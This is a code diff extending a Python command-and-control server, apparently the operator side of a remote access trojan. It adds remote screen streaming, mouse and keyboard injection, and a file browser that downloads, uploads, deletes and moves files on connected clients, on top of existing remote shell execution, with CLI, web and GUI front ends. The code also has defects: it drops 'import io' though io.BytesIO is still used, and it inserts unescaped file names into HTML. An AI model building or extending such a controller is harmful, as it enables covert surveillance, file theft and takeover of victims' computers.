@@ -18,7 +18,6 @@ You can type `help` at the server prompt for available commands.
 from __future__ import annotations
 
 import argparse
-import io
 import json
 import os
 import socket
@@ -126,12 +125,26 @@ class CNCServer:
                     pass
                 elif mtype == "desktop_frame":
                     # Store the latest desktop frame
-                    session.last_desktop_frame = msg.get("image")
-                    self._emit_event("desktop_frame", {"id": cid, "image": msg.get("image")})
+                    img_val = msg.get("image")
+                    session.last_desktop_frame = (str(img_val) if img_val else None)
+                    self._emit_event("desktop_frame", {"id": cid, "image": img_val})
                 else:
                     print(f"[cnc] From client #{cid}: {msg}")
                     session.last_response = msg
-                    self._emit_event("client_response", {"id": cid, "response": msg})
+                    mtype = msg.get("type")
+                    # Emit specific events for file and desktop status messages
+                    if mtype in (
+                        "list_dir_result", "list_dir_error",
+                        "download_result", "download_error",
+                        "upload_result", "upload_error",
+                        "mkdir_result", "mkdir_error",
+                        "rm_result", "rm_error",
+                        "mv_result", "mv_error",
+                        "desktop_started", "desktop_stopped",
+                    ):
+                        self._emit_event(mtype, {"id": cid, **msg})
+                    else:
+                        self._emit_event("client_response", {"id": cid, "response": msg})
         finally:
             session.alive = False
             with self._lock:
@@ -190,9 +203,19 @@ Commands:
   exec <cmd>            Execute a shell command on the selected client
   cd <path>             Change working directory on the selected client
   pwd                   Print working directory on the selected client
-  desktop_start [fps]   Start remote desktop streaming (default: 5 fps)
+    desktop_start [opts]  Start remote desktop streaming
+                                                opts: fps=<n> quality=<10-95> scale=<0.1-1.0> format=<jpeg|png> region=<x1,y1,x2,y2>
   desktop_stop          Stop remote desktop streaming
-  desktop_frame         Request a single screenshot
+    desktop_frame [opts]  Request a single screenshot (same opts as desktop_start)
+    mouse_move x y        Move mouse to (x,y)
+    mouse_click [button]  Click mouse (left|right|middle)
+    key_press <key>       Send a simple key press
+    ls [path]             List directory on client
+    download <path>       Download remote file to current folder
+    upload <local> <dest> Upload local file to client path
+    mkdir <path>          Create directory on client
+    rm <path>             Remove file or empty dir on client
+    mv <src> <dst>        Rename/move on client
   exit_client           Ask the selected client to exit
   quit                  Quit this CNC server
 """.strip()
@@ -291,9 +314,37 @@ Commands:
                 print("Selected client is no longer connected.")
                 selected_id = None
                 continue
-            fps = float(arg) if arg else 5.0
-            send_json_line(session.sock, {"type": "desktop_start", "fps": fps})
-            print(f"[cnc] Started remote desktop streaming at {fps} fps")
+            from typing import Dict as _Dict, Any as _Any
+            opts: _Dict[str, _Any] = {"fps": 5.0}
+            if arg:
+                for token in arg.split():
+                    if "=" in token:
+                        k, v = token.split("=", 1)
+                        k = k.strip().lower()
+                        v = v.strip()
+                        try:
+                            if k == "fps":
+                                opts["fps"] = float(v)
+                            elif k == "quality":
+                                opts["quality"] = int(v)
+                            elif k == "scale":
+                                opts["scale"] = float(v)
+                            elif k == "format":
+                                opts["format"] = v.lower()
+                            elif k == "region":
+                                parts = [p.strip() for p in v.split(",")]
+                                if len(parts) == 4:
+                                    opts["region"] = [int(parts[0]), int(parts[1]), int(parts[2]), int(parts[3])]
+                        except ValueError:
+                            pass
+                    else:
+                        # Backward compatibility for single fps value
+                        try:
+                            opts["fps"] = float(token)
+                        except ValueError:
+                            pass
+            send_json_line(session.sock, {"type": "desktop_start", **opts})
+            print(f"[cnc] Started remote desktop: {opts}")
         elif cmd == "desktop_stop":
             if selected_id is None:
                 print("No client selected. Use `list` and `use <id>` first.")
@@ -314,8 +365,161 @@ Commands:
                 print("Selected client is no longer connected.")
                 selected_id = None
                 continue
-            send_json_line(session.sock, {"type": "desktop_frame"})
-            print("[cnc] Requested screenshot")
+            from typing import Dict as _Dict, Any as _Any
+            opts: _Dict[str, _Any] = {}
+            if arg:
+                for token in arg.split():
+                    if "=" in token:
+                        k, v = token.split("=", 1)
+                        k = k.strip().lower()
+                        v = v.strip()
+                        try:
+                            if k == "quality":
+                                opts["quality"] = int(v)
+                            elif k == "scale":
+                                opts["scale"] = float(v)
+                            elif k == "format":
+                                opts["format"] = v.lower()
+                            elif k == "region":
+                                parts = [p.strip() for p in v.split(",")]
+                                if len(parts) == 4:
+                                    opts["region"] = [int(parts[0]), int(parts[1]), int(parts[2]), int(parts[3])]
+                        except ValueError:
+                            pass
+            send_json_line(session.sock, {"type": "desktop_frame", **opts})
+            print(f"[cnc] Requested screenshot with opts: {opts}")
+        elif cmd == "mouse_move":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            parts2 = arg.split()
+            if len(parts2) != 2:
+                print("Usage: mouse_move x y")
+                continue
+            try:
+                x, y = int(parts2[0]), int(parts2[1])
+            except ValueError:
+                print("x and y must be integers")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "mouse_move", "x": x, "y": y})
+        elif cmd == "mouse_click":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            button = arg.strip() or "left"
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "mouse_click", "button": button})
+        elif cmd == "key_press":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            key = arg.strip()
+            if not key:
+                print("Usage: key_press <key>")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "key_press", "key": key})
+        elif cmd == "ls":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "list_dir", "path": arg or ""})
+        elif cmd == "download":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            remote_path = arg.strip()
+            if not remote_path:
+                print("Usage: download <remote_path>")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "download", "path": remote_path})
+            print(f"[cnc] Requested download: {remote_path}")
+        elif cmd == "upload":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            parts2 = arg.split()
+            if len(parts2) != 2:
+                print("Usage: upload <local_file> <remote_path>")
+                continue
+            local_file, remote_path = parts2
+            try:
+                with open(local_file, "rb") as f:
+                    import base64
+                    data = base64.b64encode(f.read()).decode("utf-8")
+            except OSError as e:
+                print(f"[cnc] Error reading local file: {e}")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "upload", "path": remote_path, "data": data})
+            print(f"[cnc] Uploaded {local_file} -> {remote_path}")
+        elif cmd == "mkdir":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            if not arg:
+                print("Usage: mkdir <path>")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "mkdir", "path": arg})
+        elif cmd == "rm":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            if not arg:
+                print("Usage: rm <path>")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "rm", "path": arg})
+        elif cmd == "mv":
+            if selected_id is None:
+                print("No client selected. Use `list` and `use <id>` first.")
+                continue
+            parts2 = arg.split()
+            if len(parts2) != 2:
+                print("Usage: mv <src> <dst>")
+                continue
+            session = server.get_client(selected_id)
+            if session is None:
+                print("Selected client is no longer connected.")
+                selected_id = None
+                continue
+            send_json_line(session.sock, {"type": "mv", "src": parts2[0], "dst": parts2[1]})
         elif cmd == "exit_client":
             if selected_id is None:
                 print("No client selected. Use `list` and `use <id>` first.")
@@ -384,7 +588,7 @@ def parse_args() -> argparse.Namespace:
 def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
     """Run Flask web interface."""
     try:
-        from flask import Flask, render_template_string, jsonify, request
+        from flask import Flask, render_template_string
         from flask_socketio import SocketIO, emit
     except ImportError:
         print("[cnc] ERROR: Flask and Flask-SocketIO are required for web mode.")
@@ -461,11 +665,20 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
             <h2>Remote Desktop</h2>
             <div id="desktop-viewer" class="desktop-viewer" style="display: none;">
                 <div class="desktop-controls">
-                    <button class="btn-success" onclick="sendCommand('desktop_start')">Start Streaming</button>
+                    <button class="btn-success" onclick="startDesktop()">Start Streaming</button>
                     <button class="btn-danger" onclick="sendCommand('desktop_stop')">Stop Streaming</button>
-                    <button class="btn-primary" onclick="sendCommand('desktop_frame')">Single Screenshot</button>
+                    <button class="btn-primary" onclick="singleScreenshot()">Single Screenshot</button>
                     <input type="number" id="desktop-fps" value="5" min="1" max="30" step="1" style="width: 80px; padding: 10px; border: 1px solid #555; border-radius: 5px; background: #333; color: #e0e0e0;">
                     <label style="color: #aaa;">FPS</label>
+                    <input type="number" id="desktop-quality" value="75" min="10" max="95" step="5" style="width: 90px; padding: 10px; border: 1px solid #555; border-radius: 5px; background: #333; color: #e0e0e0;">
+                    <label style="color: #aaa;">Quality</label>
+                    <input type="number" id="desktop-scale" value="1.0" min="0.1" max="1.0" step="0.1" style="width: 90px; padding: 10px; border: 1px solid #555; border-radius: 5px; background: #333; color: #e0e0e0;">
+                    <label style="color: #aaa;">Scale</label>
+                    <select id="desktop-format" style="padding: 10px; border: 1px solid #555; border-radius: 5px; background: #333; color: #e0e0e0;">
+                        <option value="jpeg">JPEG</option>
+                        <option value="png">PNG</option>
+                    </select>
+                    <input type="text" id="desktop-region" placeholder="region x1,y1,x2,y2" style="min-width: 180px; padding: 10px; border: 1px solid #555; border-radius: 5px; background: #333; color: #e0e0e0;">
                 </div>
                 <div id="desktop-info" class="desktop-info">No desktop stream active</div>
                 <img id="desktop-image" src="" alt="Remote Desktop" style="display: none;">
@@ -473,6 +686,19 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
             <div id="desktop-placeholder" style="color: #aaa; padding: 20px; text-align: center;">
                 Select a client and start remote desktop to view their screen
             </div>
+        </div>
+
+        <div class="section">
+            <h2>File Browser</h2>
+            <div class="controls">
+                <input type="text" id="fb-path" placeholder="Enter path or leave blank for current" />
+                <button class="btn-primary" onclick="loadDir()">Load</button>
+                <input type="file" id="fb-upload-file" />
+                <input type="text" id="fb-upload-dest" placeholder="Remote destination path" />
+                <button class="btn-success" onclick="uploadFile()">Upload</button>
+            </div>
+            <div id="fb-info" class="desktop-info">No directory loaded</div>
+            <div id="fb-list" class="clients-list"></div>
         </div>
 
         <div class="section">
@@ -528,6 +754,60 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
                 document.getElementById('desktop-viewer').style.display = 'block';
                 document.getElementById('desktop-placeholder').style.display = 'none';
                 document.getElementById('desktop-info').textContent = 'Streaming active - Last frame received';
+            }
+        });
+
+        socket.on('desktop_started', (data) => {
+            if (data.id === selectedClientId) {
+                addOutput(`[Client #${data.id}] Desktop started: fps=${data.fps} quality=${data.quality} scale=${data.scale} format=${data.format}`);
+            }
+        });
+        socket.on('desktop_stopped', (data) => {
+            if (data.id === selectedClientId) {
+                addOutput(`[Client #${data.id}] Desktop stopped`);
+            }
+        });
+
+        socket.on('list_dir_result', (data) => {
+            if (data.id === selectedClientId) {
+                renderDir(data.path, data.items);
+            }
+        });
+        socket.on('list_dir_error', (data) => {
+            if (data.id === selectedClientId) {
+                addOutput(`[Error] list_dir: ${data.error}`);
+            }
+        });
+        socket.on('download_result', (data) => {
+            if (data.id === selectedClientId) {
+                const a = document.createElement('a');
+                const bytes = atob(data.data);
+                const arr = new Uint8Array(bytes.length);
+                for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
+                const blob = new Blob([arr.buffer]);
+                const url = URL.createObjectURL(blob);
+                a.href = url;
+                const name = data.path.split('/').pop().split('\\').pop();
+                a.download = name || 'download.bin';
+                a.click();
+                URL.revokeObjectURL(url);
+                addOutput(`[Download] Saved ${data.path}`);
+            }
+        });
+        socket.on('download_error', (data) => {
+            if (data.id === selectedClientId) {
+                addOutput(`[Error] download: ${data.error}`);
+            }
+        });
+        socket.on('upload_result', (data) => {
+            if (data.id === selectedClientId) {
+                addOutput(`[Upload] OK -> ${data.path}`);
+                loadDir();
+            }
+        });
+        socket.on('upload_error', (data) => {
+            if (data.id === selectedClientId) {
+                addOutput(`[Error] upload: ${data.error}`);
             }
         });
 
@@ -610,14 +890,110 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
                 addOutput('[Error] No client selected');
                 return;
             }
-            if (cmd === 'desktop_start') {
-                const fps = document.getElementById('desktop-fps') ? parseFloat(document.getElementById('desktop-fps').value) : 5;
-                socket.emit('command', {client_id: selectedClientId, command: cmd, argument: fps.toString()});
-                addOutput(`[Command] Client #${selectedClientId}: ${cmd} (${fps} fps)`);
-            } else {
-                socket.emit('command', {client_id: selectedClientId, command: cmd, argument: arg});
-                addOutput(`[Command] Client #${selectedClientId}: ${cmd} ${arg}`);
+            socket.emit('command', {client_id: selectedClientId, command: cmd, argument: arg});
+            addOutput(`[Command] Client #${selectedClientId}: ${cmd} ${arg}`);
+        }
+
+        function startDesktop() {
+            const fps = parseFloat(document.getElementById('desktop-fps').value || '5');
+            const q = parseInt(document.getElementById('desktop-quality').value || '75');
+            const s = parseFloat(document.getElementById('desktop-scale').value || '1.0');
+            const f = document.getElementById('desktop-format').value || 'jpeg';
+            const r = (document.getElementById('desktop-region').value || '').trim();
+            let arg = `fps=${fps} quality=${q} scale=${s} format=${f}`;
+            if (r) arg += ` region=${r}`;
+            sendCommand('desktop_start', arg);
+        }
+
+        function singleScreenshot() {
+            const q = parseInt(document.getElementById('desktop-quality').value || '75');
+            const s = parseFloat(document.getElementById('desktop-scale').value || '1.0');
+            const f = document.getElementById('desktop-format').value || 'jpeg';
+            const r = (document.getElementById('desktop-region').value || '').trim();
+            let arg = `quality=${q} scale=${s} format=${f}`;
+            if (r) arg += ` region=${r}`;
+            sendCommand('desktop_frame', arg);
+        }
+
+        function loadDir() {
+            if (selectedClientId === null) {
+                addOutput('[Error] No client selected');
+                return;
             }
+            const p = document.getElementById('fb-path').value || '';
+            socket.emit('command', {client_id: selectedClientId, command: 'list_dir', argument: p});
+        }
+
+        function renderDir(path, items) {
+            document.getElementById('fb-info').textContent = `Path: ${path}`;
+            const list = document.getElementById('fb-list');
+            list.innerHTML = '';
+            if (!items || items.length === 0) {
+                list.innerHTML = '<p style="color:#aaa">Empty directory</p>';
+                return;
+            }
+            items.sort((a,b)=>{
+                if (a.is_dir && !b.is_dir) return -1;
+                if (!a.is_dir && b.is_dir) return 1;
+                return a.name.localeCompare(b.name);
+            });
+            items.forEach(it => {
+                const card = document.createElement('div');
+                card.className = 'client-card';
+                const type = it.is_dir ? 'DIR' : 'FILE';
+                card.innerHTML = `
+                    <div><strong>${type}</strong> ${it.name}</div>
+                    <div class="client-info">Size: ${it.size ?? '-'} | mtime: ${new Date((it.mtime||0)*1000).toLocaleString()}</div>
+                    <div class="controls">
+                        ${it.is_dir ? `<button class="btn-primary" onclick="enterDir('${path}','${it.name}')">Open</button>` : `<button class="btn-primary" onclick="downloadFile('${path}','${it.name}')">Download</button>`}
+                        <button class="btn-danger" onclick="removePath('${path}','${it.name}', ${it.is_dir})">Delete</button>
+                    </div>
+                `;
+                list.appendChild(card);
+            });
+        }
+
+        function joinPath(base, name) {
+            if (!base) return name;
+            const sep = base.includes('\\') ? '\\' : '/';
+            return base.endsWith(sep) ? base + name : base + sep + name;
+        }
+
+        function enterDir(base, name) {
+            document.getElementById('fb-path').value = joinPath(base, name);
+            loadDir();
+        }
+
+        function downloadFile(base, name) {
+            const full = joinPath(base, name);
+            socket.emit('command', {client_id: selectedClientId, command: 'download', argument: full});
+        }
+
+        function removePath(base, name, isDir) {
+            const full = joinPath(base, name);
+            const cmd = 'rm';
+            if (!confirm(`Delete ${full}?`)) return;
+            socket.emit('command', {client_id: selectedClientId, command: cmd, argument: full});
+            setTimeout(loadDir, 500);
+        }
+
+        function uploadFile() {
+            const fileInput = document.getElementById('fb-upload-file');
+            const dest = document.getElementById('fb-upload-dest').value || '';
+            const file = fileInput.files && fileInput.files[0];
+            if (!file) { addOutput('[Error] Choose a file to upload'); return; }
+            if (!dest) { addOutput('[Error] Enter remote destination path'); return; }
+            const reader = new FileReader();
+            reader.onload = () => {
+                const arr = new Uint8Array(reader.result);
+                let b64 = '';
+                const CHUNK = 0x8000;
+                for (let i = 0; i < arr.length; i += CHUNK) {
+                    b64 += btoa(String.fromCharCode.apply(null, arr.subarray(i, i+CHUNK)));
+                }
+                socket.emit('command', {client_id: selectedClientId, command: 'upload', argument: JSON.stringify({path: dest, data: b64})});
+            };
+            reader.readAsArrayBuffer(file);
         }
 
         function addOutput(text) {
@@ -693,12 +1069,81 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
             elif command == 'pwd':
                 send_json_line(session.sock, {"type": "pwd"})
             elif command == 'desktop_start':
-                fps = float(argument) if argument else 5.0
-                send_json_line(session.sock, {"type": "desktop_start", "fps": fps})
+                # argument may be an opts string like "fps=10 quality=80 scale=0.5 format=png region=..."
+                opts = {"fps": 5.0}
+                if isinstance(argument, str) and argument:
+                    for token in argument.split():
+                        if '=' in token:
+                            k, v = token.split('=', 1)
+                            k = k.strip().lower()
+                            v = v.strip()
+                            try:
+                                if k == 'fps':
+                                    opts['fps'] = float(v)
+                                elif k == 'quality':
+                                    opts['quality'] = int(v)
+                                elif k == 'scale':
+                                    opts['scale'] = float(v)
+                                elif k == 'format':
+                                    opts['format'] = v.lower()
+                                elif k == 'region':
+                                    parts = [p.strip() for p in v.split(',')]
+                                    if len(parts) == 4:
+                                        opts['region'] = [int(parts[0]), int(parts[1]), int(parts[2]), int(parts[3])]
+                            except ValueError:
+                                pass
+                send_json_line(session.sock, {"type": "desktop_start", **opts})
             elif command == 'desktop_stop':
                 send_json_line(session.sock, {"type": "desktop_stop"})
             elif command == 'desktop_frame':
-                send_json_line(session.sock, {"type": "desktop_frame"})
+                # pass-through string options for single screenshot
+                if isinstance(argument, str) and argument:
+                    # reuse same parser as desktop_start
+                    from typing import Dict as _Dict, Any as _Any
+                    opts: _Dict[str, _Any] = {}
+                    for token in argument.split():
+                        if '=' in token:
+                            k_v = token.split('=', 1)
+                            k = k_v[0].strip().lower()
+                            v = k_v[1].strip()
+                            try:
+                                if k == 'quality':
+                                    opts['quality'] = int(v)
+                                elif k == 'scale':
+                                    opts['scale'] = float(v)
+                                elif k == 'format':
+                                    opts['format'] = v.lower()
+                                elif k == 'region':
+                                    parts = [p.strip() for p in v.split(',')]
+                                    if len(parts) == 4:
+                                        opts['region'] = [int(parts[0]), int(parts[1]), int(parts[2]), int(parts[3])]
+                            except ValueError:
+                                pass
+                    send_json_line(session.sock, {"type": "desktop_frame", **opts})
+                else:
+                    send_json_line(session.sock, {"type": "desktop_frame"})
+            elif command == 'list_dir':
+                send_json_line(session.sock, {"type": "list_dir", "path": argument})
+            elif command == 'download':
+                send_json_line(session.sock, {"type": "download", "path": argument})
+            elif command == 'upload':
+                # argument is JSON string with {path, data}
+                try:
+                    payload = json.loads(argument) if isinstance(argument, str) else {}
+                except Exception:
+                    payload = {}
+                send_json_line(session.sock, {"type": "upload", "path": payload.get('path', ''), "data": payload.get('data', '')})
+            elif command == 'mkdir':
+                send_json_line(session.sock, {"type": "mkdir", "path": argument})
+            elif command == 'rm':
+                send_json_line(session.sock, {"type": "rm", "path": argument})
+            elif command == 'mv':
+                try:
+                    parts = argument.split()
+                    send_json_line(session.sock, {"type": "mv", "src": parts[0], "dst": parts[1]})
+                except Exception:
+                    emit('command_result', {'success': False, 'message': 'Usage: mv <src> <dst>'})
+                    return
             elif command == 'exit':
                 send_json_line(session.sock, {"type": "exit"})
             else:
@@ -740,11 +1185,25 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
                 socketio.emit('desktop_frame', data, namespace='/')
             except Exception as e:
                 print(f"[cnc] Error emitting desktop_frame: {e}")
+        # Forward file operation and desktop status events
+        if event_type in (
+            'list_dir_result','list_dir_error',
+            'download_result','download_error',
+            'upload_result','upload_error',
+            'mkdir_result','mkdir_error',
+            'rm_result','rm_error',
+            'mv_result','mv_error',
+            'desktop_started','desktop_stopped',
+        ):
+            try:
+                socketio.emit(event_type, data, namespace='/')
+            except Exception as e:
+                print(f"[cnc] Error emitting {event_type}: {e}")
 
     server.register_event_callback(on_event)
 
     print(f"[cnc] Web interface available at http://{web_host}:{web_port}")
-    print(f"[cnc] Press Ctrl+C to stop")
+    print("[cnc] Press Ctrl+C to stop")
     socketio.run(app, host=web_host, port=web_port, allow_unsafe_werkzeug=True)
 
 
@@ -898,7 +1357,8 @@ def run_gui(server: CNCServer) -> None:
     desktop_image_label = ttk.Label(desktop_frame, text="No desktop stream active")
     desktop_image_label.pack(fill=tk.BOTH, expand=True, pady=5)
     
-    desktop_photo = None
+    from typing import Any as _Any
+    desktop_ref: dict[str, _Any] = {"photo": None}
 
     # Output frame
     output_frame = ttk.Frame(root, padding=10)
@@ -922,7 +1382,8 @@ def run_gui(server: CNCServer) -> None:
                 try:
                     import base64
                     from PIL import Image, ImageTk
-                    img_data = base64.b64decode(data['image'])
+                    img_str = str(data.get('image', ''))
+                    img_data = base64.b64decode(img_str)
                     img = Image.open(io.BytesIO(img_data))
                     # Resize if too large
                     max_width = 800
@@ -930,9 +1391,8 @@ def run_gui(server: CNCServer) -> None:
                         ratio = max_width / img.width
                         new_height = int(img.height * ratio)
                         img = img.resize((max_width, new_height), Image.Resampling.LANCZOS)
-                    global desktop_photo
-                    desktop_photo = ImageTk.PhotoImage(img)
-                    desktop_image_label.config(image=desktop_photo, text="")
+                    desktop_ref["photo"] = ImageTk.PhotoImage(img)
+                    desktop_image_label.config(image=desktop_ref["photo"], text="")
                 except Exception as e:
                     desktop_image_label.config(image="", text=f"Error displaying image: {e}")
 
@@ -956,10 +1416,11 @@ def main() -> None:
 
     args = parse_args()
 
-    host = args.host or (server_cfg.get("host") if isinstance(server_cfg, dict) else None) or "0.0.0.0"
-    port = args.port or int(
-        (server_cfg.get("port") if isinstance(server_cfg, dict) else 9001)
-    )
+    host_cfg = server_cfg.get("host") if isinstance(server_cfg, dict) else None
+    host = args.host or (host_cfg if host_cfg else "0.0.0.0")
+
+    port_cfg = server_cfg.get("port") if isinstance(server_cfg, dict) else None
+    port = args.port if args.port is not None else (int(port_cfg) if port_cfg is not None else 9001)
 
     server = CNCServer(host, port)
     server.start()
